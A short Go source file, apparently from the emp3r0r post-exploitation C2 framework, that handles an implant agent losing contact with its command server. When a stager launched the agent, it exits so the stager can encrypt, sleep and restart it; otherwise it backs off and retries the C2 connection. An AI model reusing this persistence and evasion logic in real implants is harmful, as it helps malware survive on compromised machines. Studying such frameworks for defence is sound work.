//go:build linux
// +build linux

package main

import (
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// conditionalC2FailNotify tells the parent (stager/loader) to recycle us.
func conditionalC2FailNotify() {
	// If run by stager, exit cleanly (Stager will encrypt and sleep us, then restart)
	if common.RuntimeConfig.IsRunByStager {
		logging.Warningf("Agent lifecycle ended, recycling")
		os.Exit(0)
	}

	// Otherwise, back off and retry
	takeC2Backoff()
}
